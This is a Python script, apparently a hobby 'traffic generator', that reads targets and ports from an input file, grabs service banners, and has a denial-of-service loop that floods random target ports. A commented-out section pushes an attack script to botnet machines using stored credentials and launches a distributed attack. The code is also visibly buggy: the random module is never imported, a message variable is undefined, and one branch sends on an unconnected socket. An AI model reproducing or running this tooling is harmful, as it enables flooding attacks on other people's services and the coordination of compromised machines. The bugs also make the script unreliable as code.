# Traffic Generator
from Inputs import get_inputs
import Botnet
import getpass, socket, time, subprocess, threading, sys, json

# generate regular traffic and requests
def generate_traffic(targets, transmission, ports, buffer_size, message):
    data_package = {}
    if transmission == "TCP":
        for target in targets:
            data_package[target] = []
            for port in ports:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    conn.connect((target, port))
                    if port == 80:
                        conn.sendall(b"GET / HTTP/1.0\r\n\r\n")
                        data = conn.recv(buffer_size)
                        data = data.decode()
                        data = data.rstrip()
                        data_package[target].append((port, data))
                    else:
                        data = conn.recv(buffer_size)
                        data = data.decode()
                        data = data.rstrip()
                        data_package[target].append((port, data))
                except Exception as error:
                    data_package[target].append((port, str(error)))
    elif transmission == "UDP":
        try:
            for target in targets:
                data_package[target] = []
                for port in ports:
                    conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    conn.connect((target, port))
                    data = conn.sendto(message.encode(), (target, port))
                    data_package[target].append((port, data))
        except Exception as error:
            data_package[target].append((port, str(error)))

    return(data_package)

# attempt denial of service on host
def dos(targets, transmission, ports, buffer_size, message):
    # attempt to cause overload for other TCP/UDP ports
    while True:
        if transmission == "TCP":
            target = random.choice(targets)
            port = random.choice(ports)
            try:
                if not port == 80:
                    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    conn.connect((target, port))

                    data = conn.recv(buffer_size)

                    conn.close()
                else:
                    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    conn.sendall(b"GET / HTTP/1.0\r\n\r\n")
                    conn.close()
            except Exception as error:
                pass

        elif transmission == "UDP":
            target = random.choice(targets)
            port = random.choice(ports)
            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                conn.connect((target, port))

                conn.sendto(attack_message.encode(), (target, port))
                conn.close()
            except Exception as error:
                pass

    return(data)

# attempt distributed denial of service on host with multiple bots (botnet) and localhost
def ddos(bot, username, password, script):
    Botnet.generate_dos(bot, username, password, script)
    return()

username = getpass.getuser()
filename = "C:\\Users\\{}\\eclipse-workspace\\traffic-gen\\inputs.txt".format(username)

inputs = get_inputs(filename)

transmission = inputs['Transmission']

ports = inputs['Port(s)']
ports = ports.replace("[", "")
ports = ports.replace("]", "")
ports = ports.split(",")

# not all elements will be filled, so pass if invalid literal
for port in ports:
    try:
        int_port = int(port)
        idx = ports.index(port)
        ports[idx] = int_port
    except Exception as error:
        pass

ports = [port for port in ports if not type(port) is str]
port_string = [str(port) for port in ports if not port == ' ']

buffer_size = inputs['Packet Size']

targets = inputs['Targets(s)']
targets = targets.replace("[", "")
targets = targets.replace("]", "")
targets = targets.split(",")
targets = [target for target in targets if not target == ' ']

_dos = inputs['DOS']

# apply byte conversion if required
if "KB" in buffer_size:
    buffer_size = buffer_size.replace("Kb", "")
    buffer_size = int(buffer_size) * 1024
elif "B" in buffer_size:
    buffer_size = int(buffer_size.replace("B", ""))

_stdout = "Target(s): {}, Protocol: {}, Port(s): {}, Buffer Size: {} bytes. \n".format(", ".join(targets), transmission, ", ".join(port_string), str(buffer_size))
sys.stdout.write(_stdout)
sys.stdout.flush()

if _dos == "NONE":
    message = "General Traffic"
    output = generate_traffic(targets, transmission, ports, buffer_size, message)
    sys.stdout.write(json.dumps(output) + "\n")
    sys.stdout.flush()
elif _dos == "SINGLE":
    sys.stdout.write("DOS on {}.".format(", ".join(targets)))
    sys.stdout.flush()
    message = "DENIAL OF SERIVCE"
    output = dos(targets, transmission, ports, buffer_size, message)
# elif _dos == "DISTRIBUTED":
#     sys.stdout.write("PREPARING BOTNET...")
#     sys.stdout.flush()
#     # generate bot_dos.py
#     script = Botnet.create_bot_dos_script(targets, att_msg, port_string, transmission, buffer_size)
#     # transfer the script to each bot
#     for bot, bot_credentials in botnet.items():
#         username = bot_credentials[0]
#         password = bot_credentials[1]
#         Botnet.transfer_script(bot, username, password, script)

#     # run the attack
#     sys.stdout.write("BOTNET READY")
#     sys.stdout.flush()
#     for bot, bot_credentials in botnet.items():
#         username = bot_credentials[0]
#         password = bot_credentials[1]
#         _thread = threading.Thread(target=ddos, args=((bot, username, password, script)))
#         _thread.start()
#         sys.stdout.write("{} is attacking {}.".format(bot, ", ".join(targets)))
#         sys.stdout.flush()

sys.exit(0)